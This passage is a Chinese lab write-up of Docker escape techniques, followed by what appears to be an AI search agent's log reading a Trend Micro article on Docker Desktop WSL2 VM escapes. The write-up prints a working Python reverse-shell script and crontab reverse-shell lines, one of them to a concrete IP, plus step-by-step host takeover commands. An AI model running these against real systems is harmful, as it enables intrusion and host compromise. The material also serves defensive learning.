20:36")\nDocker相关安全风险更多集中在Docker逃逸方面\n和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件\n## 判断是否为容器环境\n在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：[快速识别虚拟主机、Docker和K8s集群环境](https://www.cnblogs.com/yuy0ung/articles/18220591)\n不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：\n\n```\nls -al /.dockerenv\n\n```\n\n![image-20250331160431814](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331160431814.png)\n确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：<https://github.com/teamssix/container-escape-check>\n## 挂载宿主机procfs逃逸\n### 基础概念\nprocfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件\nuser namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID\n而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：\n从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行\n### 环境搭建\n创建容器并挂载/proc目录：\n\n```\ndocker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu\n\n```\n\n搭建完毕\n### 信息搜集\n如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：\n\n```\nfind / -name core_pattern\n\n```\n\n![image-20250331165144667](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165144667.png)\n### 漏洞利用\n找到当前容器在主机下的绝对路径：\n\n```\ncat /proc/mounts | xargs -d \',\' -n 1 | grep workdir\n\n```\n\n![image-20250331165346849](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331165346849.png)\n可以看到绝对路径为`/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work`\n接下来安装vim和gcc：\n\n```\napt-get update -y && apt-get install vim gcc -y\n\n```\n\n然后创建一个python脚本用于反弹shell：\n\n```\n#!/usr/bin/python3\nimport  os\nimport pty\nimport socket\nlhost = "xx.xx.xx.xx"\nlport = 7777\ndef main():\n   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   s.connect((lhost, lport))\n   os.dup2(s.fileno(), 0)\n   os.dup2(s.fileno(), 1)\n   os.dup2(s.fileno(), 2)\n   os.putenv("HISTFILE", \'/dev/null\')\n   pty.spawn("/bin/bash")\n   # os.remove(\'/tmp/.shell.py\')\n   s.close()\nif __name__ == "__main__":\n   main()\n\n```\n\n赋予执行权限：\n\n```\nchmod 777 .shell.py\n\n```\n\n将脚本写入到目标的proc目录下：\n\n```\necho -e "|/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/merged/tmp/.shell.py \\rcore    " >  /host/proc/sys/kernel/core_pattern\n\n```\n\n![image-20250331171439634](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331171439634.png)\n在攻击机上开启监听，接下来只需要让容器崩溃重启即可执行反弹shell脚本，使用程序实现：\n\n```\n#include<stdio.h>\nint main(void)  {\n   int *a  = NULL;\n   *a = 1;\n   return 0;\n}\n\n```\n\ngcc编译：\n\n```\ngcc .crash.c -o .crash\n\n```\n\n执行编译后的程序使docker崩溃触发core dump，此时宿主机/proc/sys/kernel/core_pattern 中写入的.shell.py会被执行\n![image-20250331173920827](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331173920827.png)\n成功监听到宿主机的反弹shell：\n![image-20250331174229302](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250331174229302.png)\n至此，我们完成了一次挂载宿主机procfs逃逸\n## 挂载docker socket逃逸\n### 基础概念\nDocker Socket (/var/run/docker.sock) 是 Docker 守护进程（dockerd） 与 客户端（如 docker CLI、Docker API 调用） 之间的主要通信接口，即用来与守护进程通信即查询信息或者下发命令\n若容器挂载了`/var/run/docker.sock`，就相当于获得了 Docker CLI（命令行接口）的完全访问权限，通过 Docker API，可以在容器内部直接管理宿主机上的 Docker 进程，最终导致容器逃逸\n### 环境搭建\n创建容器并挂载`/var/run/docker.sock`文件：\n\n```\ndocker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu\n\n```\n\n进入容器并安装docker命令行客户端：\n\n```\ndocker exec -it with_docker_sock /bin/bash\napt-get update\napt-get install curl\n\n#官网\ncurl -fsSL https://get.docker.com/ | sh\n\n#阿里云镜像\ncurl -fsSL https://get.docker.com -o install-docker.sh\nsh install-docker.sh --mirror Aliyun\n\n```\n\n至此，环境搭建完毕\n### 信息搜集\n直接检查是否存在`/var/run/docker.sock`文件：\n\n```\nls -lah /var/run/docker.sock\n\n```\n\n若文件存在，则可能存在该漏洞\n![image-20250402151845586](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402151845586.png)\n### 漏洞利用\n在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部：\n\n```\ndocker run -it -v /:/host ubuntu /bin/bash\n\n```\n\n此时我们可以发现/host目录就是宿主机的根目录：\n![image-20250402153914370](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402153914370.png)\n那么只需要chroot将其变为根目录一下就完成了逃逸：\n\n```\nchroot /host\n\n```\n\n![image-20250402154208382](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402154208382.png)\n## privileged特权模式逃逸\n### 基础知识\n当 Docker 容器以 `--privileged` 启动时，会获得以下权限：\n  * **完全设备访问权限** ：可访问宿主机所有设备（如 `/dev/sda`或`vda`、`/dev/tty` 等）。\n  * **绕过 Linux Capabilities 限制** ：默认容器仅保留部分权限（如 `CAP_CHOWN`、`CAP_NET_BIND_SERVICE`），特权模式赋予容器 **所有 Capabilities** （包括 `CAP_SYS_ADMIN`）。\n  * **禁用安全隔离机制** ：包括 Seccomp、AppArmor/SELinux 的部分限制\n\n\n在这种情况下，就有可能将宿主机文件系统挂载到容器内部造成逃逸\n### 环境搭建\n首先有一个普通用户 yuy0ung 并且加入了 docker 组：\n\n```\nsudo useradd -m -s /bin/bash yuy0ung\nsudo passwd yuy0ung\nsudo usermod -aG docker yuy0ung\nsu - yuy0ung\n\n```\n\n![image-20250402162542136](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402162542136.png)\n在普通用户下使用`--privileged=true`创建一个容器\n\n```\ndocker run --rm --privileged=true -it alpine\n\n```\n\n至此环境搭建完毕\n### 信息搜集\n判断是否为特权模式：\n\n```\ncat /proc/self/status | grep CapEff\n\n```\n\n如果docker是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff:\n![image-20250402163607483](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163607483.png)\n可见容器确实是特权模式启动\n### 漏洞利用\n#### 方法1\n查看磁盘挂载设备：\n\n```\nfdisk -l\n\n```\n\n![image-20250402163813610](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402163813610.png)\n可以看到有一个39.8G的磁盘`/dev/vda3`，这就是宿主机文件，将其挂载到/test目录:\n\n```\nmkdir /test && mount /dev/vda3 /test\n\n```\n\n此时已经成功挂载宿主机根目录：  \n![image-20250402203050150](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203050150.png)\n可以尝试读取任意文件：  \n![image-20250402203332217](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402203332217.png)\n我们还可以尝试写定时任务来反弹shell：\n\n```\necho \'* * * * * root /bin/bash -c "sh -i >& /dev/tcp/47.94.106.5/7777 0>&1"\' >> /test/etc/crontab\n\n```\n\n![image-20250402224224679](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224224679.png)\n成功监听到宿主机root权限的反弹shell：\n![image-20250402224142981](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224142981.png)\n至此，成功逃逸\n#### 方法2\n和前面提到的方法类似，由于我们将宿主机根目录挂载到了`/test`，而我们的shell本身权限又是root，所以这里可以直接chroot将/test改为根目录：\n\n```\nchroot /test\n\n```\n\n![image-20250402224808056](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250402224808056.png)\n当然到这一步我们的方法不仅仅拘泥于我提到的，因为我们是高权限，所以也可以尝试在直接去添加新的root组用户并登录等操作\n## docker远程API未授权访问逃逸\n### 基础知识\ndocker remote api 可以执行 docker 命令，若配置错误将其暴露在公网，攻击者可通过远程调用 Docker API直接管理容器，进而导致逃逸getshell\n### 环境搭建\n将docker守护进程监听在0.0.0.0：\n\n```\ndockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375\n\n```\n\n如果有防火墙记得开放2375端口\n### 信息搜集\n直接访问服务器2375端口：\n![image-20250408210911881](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408210911881.png)\n如果响应为上图这样既表明存在漏洞\n也可以使用我们的docker尝试远程调用该端口api：\n\n```\ndocker -H tcp://x.x.x.x:2375 images\n\n```\n\n![image-20250408211156682](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211156682.png)\n可以看到我们成功调用该api并列出了该docker的镜像，即漏洞存在\n### 漏洞利用\n在这种情况下，我们相当于可以任意控制目标服务器的docker了，那么我们可以新运行一个容器，挂载点设置为服务器的根目录挂载至/yuy0ung目录下\n\n```\ndocker -H tcp://xx.xx.xx.xx:2375 run -it -v /:/yuy0ung nginx:latest /bin/bash\n\n```\n\n![image-20250408211828439](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408211828439.png)\n那么接下来的思路就和上面差不多了，chroot或者写一个定时任务即可实现逃逸：\n  * chroot:\n![image-20250408212104350](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408212104350.png)\n  * 定时任务监听：\n\n```\necho \'* * * * * root /bin/bash -c "sh -i >& /dev/tcp/xx.xx.xx.xx/7777 0>&1"\' >> /yuy0ung/etc/crontab\n\n```\n\n![image-20250408213527317](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250408213527317.png)\n\n\n至此成功获取宿主机权限\n## 内核漏洞逃逸\n就是宿主机的内核存在漏洞的情况下的一些利用，简单来说就是提权类的内核漏洞会很可能导致容器逃逸\n这些内核漏洞通常是一些CVE，以CVE-2016-5195（dirty cow）为例：\n和权限提升时的dirty利用方法差不太多，之所以能实现逃逸，是因为docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机，其他的利用细节不再赘述，可以参考我的这篇文章：[linux提权-内核提权](https://www.cnblogs.com/yuy0ung/articles/18326546)\n除了脏牛，还有很多内核漏洞导致的逃逸，这里列举一些就不细讲了：\n  * CVE-2019-16884\n  * CVE-2021-3493\n  * CVE-2021-22555\n  * CVE-2022-0492\n  * CVE-2022-0847\n  * CVE-2022-23222\n\n\n## docker用户组提权\n该trick其实可以归类到liunx提权里面的，不过也涉及到了docker以及逃逸所以放到这里记录：\n### 基础知识\nDocker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能运行\nDocker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，就相当于拥有了root 的访问权限\n### 环境搭建\n由于前面复现特权模式逃逸的时候，我们已经创建了一个yuy0ung用户并加入了docker组，所以切换到该用户即可进行复现：\n![image-20250410181642354](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410181642354.png)\n### 信息搜集\n查看发现当前用户在docker组中：  \n![image-20250410195542345](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410195542345.png)\n那么可以尝试docker用户组提权\n### 漏洞利用\n这里直接拉取一个针对上面情况的提权镜像，大致原理就是拉取镜像时将宿主机根目录挂载进docker，而docker启动后自动执行启动脚本chroot逃逸出来了，详细内容可以参考镜像的github：<https://github.com/chrisfosterelli/dockerrootplease>\n\n```\ndocker run -v /:/hostOS -it --rm chrisfosterelli/rootplease\n\n```\n\n![image-20250410200514449](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250410200514449.png)\n可以看到直接就提升到root权限了，其实和前面的chroot逃逸差不多\n## 针对docker逃逸的防御措施\n针对上面提到的手段，可以有如下防御措施：\n  * 即时更新docker\n  * docker使用capabilities时需要遵循最小特权原则\n  * 尽量在启动容器时使用--user选项指定容器以非特权用户身份运行\n  * 不要直接挂载主机文件，尽量使用数据卷或共享文件系统\n  * 将容器中的root用户映射为宿主机中的普通用户\n  * 不要在容器中挂载docker socket，也不要将docker api配置到公网\n\n\n参考链接：<https://wiki.teamssix.com/CloudNative/>\n分类: [权限提升](https://www.cnblogs.com/yuy0ung/category/2405904.html), [云安全](https://www.cnblogs.com/yuy0ung/category/2405905.html), [docker安全](https://www.cnblogs.com/yuy0ung/category/2471425.html)\n免责声明：本内容来自平台创作者，博客园系信息发布平台，仅提供信息存储空间服务。 ((('system', 'main'), ('system', 'search')), ToolMessage(role='tool', content="搜索关键词：WSL2 docker 容器 访问 宿主机 C盘\n\n1. \nclose\n  * [Security News](https://www.trendmicro.com/vinfo/us/security/news/)\n  * [Virtualization & Cloud](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud)\n  * Cracking the Isolation: Novel Docker Desktop VM Escape Techniques Under WSL2\n\n\n# Cracking the Isolation\nNovel Docker Desktop VM Escape Techniques Under WSL2\nTrendAI™ Research has discovered several new methods that enable attackers to escape Docker Desktop’s WSL2 VM and run arbitrary code on the host. Our analysis highlights how trusted development tooling can create unexpected attack surfaces when internal APIs and configuration mechanisms are left exposed.\nMarch 12, 2026\n  * Email\n  * [ Facebook ](https://www.facebook.com/sharer/sharer.php?u=https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/cracking-the-isolation-novel-docker-desktop-vm-escape-techniques-under-wsl2)\n  * [ ![](https://documents.trendmicro.com/images/uploads/svg/twitter-X-logo-wx7E8Xq.svg) Twitter ](https://x.com/intent/post?original_referer=https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/cracking-the-isolation-novel-docker-desktop-vm-escape-techniques-under-wsl2&text=Cracking%20the%20Isolation:%20Novel%20Docker%20Desktop%20VM%20Escape%20Techniques%20Under%20WSL2&tw_p=tweetbutton&url=https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/cracking-the-isolation-novel-docker-desktop-vm-escape-techniques-under-wsl2)\n  * Google+\n  * [ Linkedin ](https://www.linkedin.com/shareArticle?mini=true&url=https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/cracking-the-isolation-novel-docker-desktop-vm-escape-techniques-under-wsl2&title=Cracking%20the%20Isolation:%20Novel%20Docker%20Desktop%20VM%20Escape%20Techniques%20Under%20WSL2&summary=Cracking%20the%20Isolation:%20Novel%20Docker%20Desktop%20VM%20Escape%20Techniques%20Under%20WSL2)\n\n\n**By Nelson William Gamazo Sanchez (Senior Cloud Threat Researcher, TrendAI™ Research) and Nitesh Surana ( Senior Threat Researcher, TrendAI™ Research)**\n**Key takeaways**\n  * TrendAI™ Research has uncovered multiple new techniques that allow attackers to break Docker Desktop’s WSL2 VM isolation and execute code on the Windows host, demonstrating that the VM boundary is not a hardened security layer.\n  * These VM escape paths exploit legitimate Docker Desktop mechanisms — such as internal APIs, configuration settings, and CLI plugin loading — showing how benign, user-facing features can be repurposed for host‑level code execution.\n  * Organizations should strengthen monitoring and governance around developer environments, validating Docker Desktop configurations and watching for anomalous API usage or unexpected binary execution to mitigate the risks.\n\n\n## Overview of Docker Desktop VM escapes\nSecurity nowadays is approached by implementing multiple layers of mitigations, isolation, and protection mechanisms. Security mitigations are designed to disrupt attack techniques, while isolation layers constrain the attacks’ impact when the mitigations fail. When isolation techniques are in place, the security risk assessments are downgraded because of the implicit trust in the isolation itself. What if isolation itself has been breached?\nIn this research feature, we discuss five novel findings around breaking isolation between the Docker Desktop virtual machine (VM) and the Windows host using the Windows Subsystem for Linux (WSL).\nDocker Desktop is used in enterprise environments to accelerate how teams build, test, and prepare software for deployment. Given its importance, it has been consistently scrutinized in [recent Pwn2Own competitions](https://www.zerodayinitiative.com/blog/2025/5/15/pwn2own-berlin-2025-day-one-result) where part of the challenge is not only to escape the Docker container with the default set of privileges, but also to execute code on the underlying host by escaping the Docker Desktop VM.\nIt is important to note that there is a difference between Docker Engine container escapes and Docker Desktop VM escapes. The former are usually achieved by exploiting a Linux kernel vulnerability, or other [vulnerabilities](https://www.zerodayinitiative.com/advisories/ZDI-25-626/) in Docker Desktop using a malicious container. However, under WSL, such container escapes only give control to the attacker over the Docker Desktop VM, since the Docker Engine runs inside a WSL VM.\nThe Docker Desktop VM is a Linux distribution instantiated by WSL as a guest operating system running on a special version of Hyper-V as an isolated VM. The attacker must find escapes from that Docker Desktop VM to the host to achieve code execution in the host operating system under the current user. In the past and in previous Pwn2Own competitions, some techniques were used to escape the aforementioned VM. Although the previous Pwn2Own Docker Desktop environments were based on Linux hosts, our analysis examines Docker Desktop for Windows with the WSL2 backend.\nWe detail five cases of new findings demonstrating how attackers could escape the Docker Desktop VM. First, we describe a simplified version of the Docker Desktop architecture under WSL, along with different internal components implementing Docker communication between the Windows host and the Docker Desktop VM. This description sets up the scenarios in which the Docker VM escapes under WSL can be abused. The rest of the sections go through the details of each of the escapes.\nAs a clarification, achieving a Docker VM escape requires either a Docker Engine container escape or access to the Docker daemon. The techniques mentioned in our analysis would work only on an exposed Docker daemon over TCP on Windows hosts using the WSL2 backend. Additionally, the techniques are not based on the Docker socket. We do not focus on container escapes to illustrate the VM escape abuse. Instead, we use a container with the Docker Desktop’s root file system bind-mounted inside the container. For Docker Desktop running under WSL, the VM escape scenarios are equivalent to escaping a nonprivileged container, as the attacker gains the same access over the internal Docker API being abused.\nThis research was based on Docker Desktop for Windows with version 4.42 running on WSL2. All cases were submitted to the Docker security team, as documented in the appendix.\n## Docker Desktop architecture under WSL\nIn this section, we describe a simplified overview of the Docker Desktop architecture when configured to run with WSL, as all identified Docker VM escapes occur under this scenario.\nWhen using WSL, Docker Desktop for Windows runs the Docker containers inside a WSL VM instantiated from a WSL Linux distribution maintained by Docker. Under this architecture, containers are “double- isolated” from the Windows host operating system (OS), as shown in Figure 1. The Docker WSL VM is created by WSL using the Windows Host Compute System (HCS) API, which allows developers to manage VMs under the Hyper-V Host Compute Service.\n![Figure 1. Docker Desktop architecture under WSL](https://documents.trendmicro.com/images/uploads/cracking-the-Isolation_fig01-OdHCrOu.png)\nFigure 1. Docker Desktop architecture under WSL\nDocker containers are in the inner layer of “isolation” under the Docker container engine. A malicious container can escape to the Docker WSL VM using a kernel exploit or other vulnerabilities. Once the attacker is inside the Docker WSL VM, it has a set of privileges over the host, given that the Docker WSL VM under Hyper-V is running as the current user. However, none of these privileges allow direct code execution. For example, it can do “arbitrary write” to certain directories where the current user has permissions.\nUnder certain circumstances, if the attacker writes startup files and waits for the user to restart the machine, it can result in code execution. However, an attacker would prefer to execute code without waiting for Windows to restart. Even under those conditions, it is not possible to execute code in the host even if the attacker controls the Docker WSL VM. To do so, the attacker needs to find new exploits, or employ different techniques. That was the case presented in a previous Pwn2Own competition where at least two techniques were used for escaping the Docker VM.\n### Docker Desktop host–VM communication\nDocker Desktop for Windows has a modular and API-oriented architecture with complex interactions and multiple endpoints playing different roles. For example, there are different APIs used for main administration tasks, such as managing containers, modules, and extensions. Many — practically all — of the Docker endpoints are exposed inside the Docker WSL VM as Linux sockets, as shown in Figure 2.\n![Figure 2. High-level architecture of Docker Desktop for Windows, illustrating the exposure of Docker APIs as Linux sockets inside the Docker WSL VM](https://documents.trendmicro.com/images/uploads/cracking-the-Isolation_fig02-rsfgPqw.png)\nFigure 2. High-level architecture of Docker Desktop for Windows, illustrating the exposure of Docker APIs as Linux sockets inside the Docker WSL VM\nThe Docker Engine listens to commands through the API. The interesting aspect of this architecture is that those sockets also expose functionality that can be called from inside the Docker WSL VM and execute actions back over to Docker Desktop components installed in the host. All Docker components in the default installation run as current user, except in some specific configurations. During the review of the architecture, more than 40 sockets associated with Docker functionality were identified, as shown in Figure 3.\n![Figure 3. Docker Sockets exposed in the Docker WSL VM](https://documents.trendmicro.com/images/uploads/figure%2003_1-uZlu6GR.png)![Figure 3. Docker Sockets exposed in the Docker WSL VM](https://documents.trendmicro.com/images/uploads/figure%2003_2-cdDhKps.png)\nFigure 3. Docker Sockets exposed in the Docker WSL VM\nFrom Figure 3, we can see sockets named “backend.sock” and “module-manager.sock” that seem to be prime targets for attacking. At the same time, it is known that Docker WSL VM mounts the Windows OS host root file system in _/mnt/host/c_. Access to the host file system is limited by the permissions of the current user. Figure 4 shows the attack surface from a threat actor’s perspective inside the Docker Desktop WSL VM.\n![Figure 4. Attacker’s perspective from inside the VM](https://documents.trendmicro.com/images/uploads/cracking-the-Isolation_fig04-6yJbrTH.png)\nFigure 4. Attacker’s perspective from inside the VM\nFrom Figure 4, we can see that while the attacker cannot execute code directly inside the host, the host itself has considerable exposure. The attacker can drop executable files wherever they have write permissions but cannot execute them.\nIn the following sections, we provide an overview of the sockets and the exposed APIs through these sockets. We also describe how combining exposed Linux sockets and the mounted host root file system can enable an attacker to execute code by utilizing a side effect technique.\n### Docker Desktop WSL VM exposed APIs\nDocker Desktop exposes mostly all the components’ APIs using Linux sockets inside the Docker WSL VM. Those APIs are not documented but share some similarities with the [Docker Engine API](https://docs.docker.com/reference/api/engine/version/v1.51/#section/Versioning). They can be reversed from Docker binaries, but in many cases, using the sockets is sufficient for discovering the functionality. This can be achieved by trial and error and performing behavior monitoring on the host.\nA closer look at the “backend.sock” socket reveals the following.\nThe endpoints of the backend API can be enumerated with a simple request:\n![The endpoints of the backend API can be enumerated with a simple request](https://documents.trendmicro.com/images/uploads/Fig%204b-Dv2DgMk.png)\nThis command dumps the full backend API endpoints and the corresponding HTTP method that needs to be used. Figure 5 shows an example.\n![Figure 5. Example of the HTTP methods used and the paths exposed by the Docker Desktop backend API](https://documents.trendmicro.com/images/uploads/figure%2005-pN9NOqm.png)\nFigure 5. Example of the HTTP methods used and the paths exposed by the Docker Desktop backend API\nThese endpoints may change across Docker versions. At the time of our research, the backend API implemented more than 200 endpoints. All these endpoints are exposed inside the Docker WSL VM and can be used for controlling the Docker Desktop environment and applications. To call these endpoints, it is required to know the URL parameters (in case of POST requests).\nDuring our research, we analyzed multiple API endpoints for mechanisms to control the Docker Desktop environment in a way that code execution could be achieved directly on the host under the current user. None of the analyzed backend endpoints had sufficient functionality to allow direct code execution for controlled attacker binaries. This led us to explore indirect execution, where we could force Docker Desktop to execute a controlled binary.\n### Backend API and Docker configuration settings\nThe Docker Desktop settings that API endpoints exposed inside the VM were “/app/settings” and “/app/settings/flat.” Both endpoints can be reached by executing the following commands:  \n  \n![Both endpoints can be reached by executing the following commands:](https://documents.trendmicro.com/images/uploads/Fig%205b-Pm16jq6.png)\nThese endpoints return a JSON response with all configuration names and values. There are around 161 different settings in Docker 4.42 - 195023. The settings endpoint has its corresponding POST endpoint, allowing it to configure Docker Desktop settings, with an example shown in Figure 6.\n![Figure 6. Data from the “/app/settings” endpoint](https://documents.trendmicro.com/images/uploads/figure%2006-gY5lwUc.png)\nFigure 6. Data from the “/app/settings” endpoint\nDuring our research, we noticed that the “/flat” version of the settings socket, which should have returned the “flat” version of the JSON, returned a different set of settings that could be controlled by a POST request to the “/app/settings” endpoint. Interestingly, some of those settings showed multiple paths for abuse.\n## Docker Desktop VM escapes\nBefore detailing the VM escapes, it is useful to highlight that these attacks assume that the inner containers already escaped using a kernel vulnerability or some weakness in the Docker architecture. However, there is a way to simulate this escape and have access to the Docker VM file system, which is by running the following command:\n![there is a way to simulate this escape and have access to the Docker VM file system, which is by running the following command](https://documents.trendmicro.com/images/uploads/Fig%207b-MF7dMgZ.png)\nThis command mounts the Docker Linux distribution root directory inside the new instantiated container under _/vm_root_. From the container shell, requests using ‘curl’ can be sent to the exposed endpoint using the sockets. In the following subsections describing the Docker Desktop VM escapes, all commands and techniques can be reproduced starting from this command.\n### Docker Desktop in Windows VM escape through credentialHelper\nAs mentioned, there is a difference between “settings” and “settings flat,” both of which can be controlled using “app/settings.” This method of Docker Desktop VM escape uses a combination of settings manipulation and exposed Linux sockets from inside the VM.\nOne of the interesting options in “settings/flat” that was not present in “settings/” was “credentialHelper”. The default value pointed to the executable name _docker-credential-wincred.exe_ , as shown in Figure 7.\n![Figure 7. Settings and value of docker-credential-wincred.exe](https://documents.trendmicro.com/images/uploads/figure%2007-fkMtHWv.png)\nFigure 7. Settings and value of _docker-credential-wincred.exe_\nDocker has a modular architecture, including modules for securely storing credentials, such as those used for logging into container registries. Docker maintains its own credentials manager called “Wincred” and the default executable path for the credential manager is:\n**C:\\Program Files\\Docker\\resources\\bin\\docker-credential-wincred.exe**\nThe default path for the credential manager is a protected location if the current user does not have administrator privileges. However, this setting can be configured to have any arbitrary location using the following command:\n![](https://documents.trendmicro.com/images/uploads/Fig%209b-ICRCpcg.png)\nExecuting this command updates the setting to _C:\\Users\\sec\\\\.docker\\calc.exe_. This path can be fully controlled by the current user regardless of their privileges. Because this path is fully user-controlled, even a low-privileged attacker can achieve code execution and escape the VM in three steps:\n  1. Find a location where a fake or malicious credential helper can be dropped.\n  2. Update the “credentialHelper” settings pointing to the new location.\n  3. Force Docker Desktop to use the credential helper using another endpoint from the inside of the Docker Desktop VM. The credential helper runs on the Windows Host, resulting in a VM escape.', tool_call_id='call_00_sDBbGZ7NzxGkKs8cwH5erq5x'))
((('system', 'main'), ('system', 'search')), AssistantMessage(role='assistant', content='', tool_calls=[{'index': 0, 'id': 'call_00_fxzq2KKmWcwgij2QaLWcR06X', 'type': 'function', 'function': {'name': 'read_pages', 'arguments': '{}'}}], reasoning_content='继续阅读。'))
((('system', 'main'), ('system', 'search')), ToolMessage(role='tool', content='\nThe first and second steps can be done through the controllable “credentialHelper” and by pointing to the user-controlled location. But how can Docker Desktop be forced to execute code from this path without waiting for user interaction?\nAs noted earlier, the exposed backend API provides many endpoints allowing users to control Docker Desktop from inside the VM, such as:\n  * /engine/stop: Stop Docker Service\n  * /engine/start: Start Docker Service\n  * /engine/restart: Restart Docker Service\n  * /app/quit: Quit Docker Desktop\n  * /app/reset: Reset all Docker Desktop settings\n\n\nAll these endpoints have an impact on the host when called from inside the VM, since they control Docker Desktop. They force the Docker backend service to restart and reload configurations and, in the last case, reset all settings.\nWith this finding, we further explored and found a Docker API that has the side effect of forcing the Docker backend services in the “host” to call the default credentials helper. We found that the “/kubernetes/start” endpoint made Docker Desktop invoke the credentialHelper executable _C:\\Users\\sec\\\\.docker\\calc.exe_ in the host, resulting in a Docker VM escape. The call to the mentioned backend API can be done with the following:\n![](https://documents.trendmicro.com/images/uploads/Fib%2010b-zEDBnnM.png)\nCalling “/kubernetes/start” results in a side effect of the Docker backend service executing _C:\\Users\\sec\\\\.docker\\calc.exe_ , as shown in Figure 8.\n![Figure 8. Docker Desktop VM escape through credentialHelper](https://documents.trendmicro.com/images/uploads/figure%2008-6t7mHSV.png)\nFigure 8. Docker Desktop VM escape through credentialHelper\nOnce the attacker controls the Docker Desktop VM from within, code execution without user interaction becomes possible by manipulating the Docker Desktop settings and abusing other backend API endpoints. This discovery is the starting point for our other findings, which follow the same technique but use different combinations of controlled paths and backend API calls with side effects. \n### Docker Desktop in Windows VM escape through Docker CLI plugins\nDocker has an extensible architecture through plugins. The Docker command-line interface (CLI) in Windows (_docker.exe_) has a set of predefined plugins that are used or called when using the Docker CLI. Depending on the command passed to the Docker CLI, different plugins process the command. Docker CLI plugins are also extensible, and custom plugins can be created by Docker users. By default, Docker ships a set of plugins installed in the path _C:\\Program Files\\Docker\\cli-plugins_.\n![Figure 9. Plugins installed in C:\\\\Program Files\\\\Docker\\\\cli-plugins](https://documents.trendmicro.com/images/uploads/figure%2009-v1Um5ES.png)\nFigure 9. Plugins installed in _C:\\Program Files\\Docker\\cli-plugins_\nAll these plugins are correctly installed under a directory location that the current user does not have permissions to modify. In turn, modifying these plugins is not possible for a potential Docker VM escape.\nFor this method, we did not use any WSL feature that allows command execution. Instead, we utilized Docker Desktop’s specific components that result in command execution in the underlying host.\nDuring our analysis, we found that Docker Desktop has another default location to load plugins, which is under _C:\\Users\\\\[Username]\\\\.docker\\cli-plugins\\\\._ This directory is controlled by the current user and has the potential for a Docker VM escape. \n**Docker CLI plugin loading**\nDuring initialization, the Docker backend executes the default plugins (shown in Figure 9) passing the command-line option _docker-cli-plugin-metadata_ to get the version information of the plugins, as shown in Figure 10.\n![Figure 10. Snippet showing the version information of docker-ai.exe, via docker-cli-plugin-metadata](https://documents.trendmicro.com/images/uploads/figure%2010-vTWzaIY.png)\nFigure 10. Snippet showing the version information of _docker-ai.exe_ , via _docker-cli-plugin-metadata_\nThis mechanism allows Docker to use the latest plugin version. During our analysis, we noticed that the default plugins stored in _C:\\Users\\sec\\\\.docker\\cli-plugins_ are also executed by the Docker backend** _._** Figure 11 shows the execution of plugins stored under this directory. In fact, Docker calls them, looking for a newer version and deciding which one to keep.\n![Figure 11. Screenshot showing that the default plugins are also executed by the Docker backend](https://documents.trendmicro.com/images/uploads/figure%2011-UHUPiYP.png)\nFigure 11. Screenshot showing that the default plugins are also executed by the Docker backend\nThis behavior happens during the Docker Desktop’s startup process. However, we noticed that the default plugins in _C:\\Users\\sec\\\\.docker\\cli-plugins\\_ , even though they also exist in 